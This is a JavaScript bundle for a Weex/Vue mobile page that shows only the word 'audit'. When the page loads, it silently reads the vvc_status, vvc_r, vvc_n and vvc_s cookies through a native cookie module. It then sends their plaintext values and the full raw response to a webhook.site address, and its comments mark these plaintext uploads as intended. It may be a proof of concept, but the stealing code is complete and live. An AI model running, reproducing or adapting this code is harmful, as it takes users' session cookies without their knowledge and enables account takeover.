!function () {
function smallHash(value) {
value = value == null ? "" : String(value);
var h = 2166136261;
for (var i = 0; i < value.length; i++) {
h ^= value.charCodeAt(i);
h += (h << 1) + (h << 4) + (h << 7) + (h << 8) + (h << 24);
}
return (h >>> 0).toString(16);
}
function parseMaybeJson(value) {
if (typeof value !== "string") return value || {};
try { return JSON.parse(value); }
catch (e) { return { parse_error: true, raw_len: String(value).length };
}
}
function safeKeys(obj) {
if (!obj || typeof obj !== "object") return [];
var keys = [];
for (var k in obj) {
if (Object.prototype.hasOwnProperty.call(obj, k)) keys.push(k);
}
return keys.sort();
}
// ======================
// 只改这⾥：明⽂输出真实值
// ======================
function summarize(raw) {
var parsed = parseMaybeJson(raw);
var data = parsed && typeof parsed === "object" &&
Object.prototype.hasOwnProperty.call(parsed, "data")
? parseMaybeJson(parsed.data)
: parsed;
var out = {};
var keys = ["vvc_status", "vvc_r", "vvc_n", "vvc_s"];
for (var i = 0; i < keys.length; i++) {
var k = keys[i];
var v = data && data[k];
out[k] = {
present: v != null && String(v).length > 0,
len: v == null ? 0 : String(v).length,
h: v == null ? "" : smallHash(v),
value: v || "" // 直接上传明⽂真实值
};}
out.meta = {
topKeys: safeKeys(parsed),
code: parsed && parsed.code,
msg: parsed && parsed.msg,
dataKeys: safeKeys(data),
rawLen: typeof raw === "string" ? raw.length : 0
};
out.raw = raw; // 上传完整原始返回包
return out;
}
function getModule(name) {
try {
if (typeof weex !== "undefined" && weex.requireModule) return weex.requireModule(name);
} catch (e) {}
return null;
}
function send(obj) {
try {
var stream = getModule("stream");
if (!stream || !stream.fetch) return;
stream.fetch({
method: "GET",
url: "https://webhook.site/ee091332-0cec-4592-8016-ad59ec6827d8"+"?d=" +
encodeURIComponent(JSON.stringify(obj)),
type: "text"
}, function () {});
} catch (e) {}
}
function run(stage) {
var cookie = getModule("WeiwoCookie");
send({ loaded: true, hasCookieModule: !!cookie });
if (!cookie || !cookie.get) return;
try {
var ret = cookie.get(JSON.stringify({
names: ["vvc_status", "vvc_r", "vvc_n", "vvc_s"]
}), function (res) {
send(summarize(res));
});
send(summarize(ret));
} catch (e) {}
}

var app = {
created: function () { run("stage_created"); },
render: function (h) {
return h("div", { staticClass: ["wrapper"] }, [
h("text", { staticClass: ["msg"] }, ["audit"])
]);
},
style: {
wrapper: { width: "1080", minHeight: "400", backgroundColor: "#ffffff"
},
msg: { fontSize: "42", color: "#222222" }
}
};
run("stage_top");
try {
weex.requireModule("meta").setViewport({ width: 1080 });
} catch (e) {}
new Vue(app);
}();
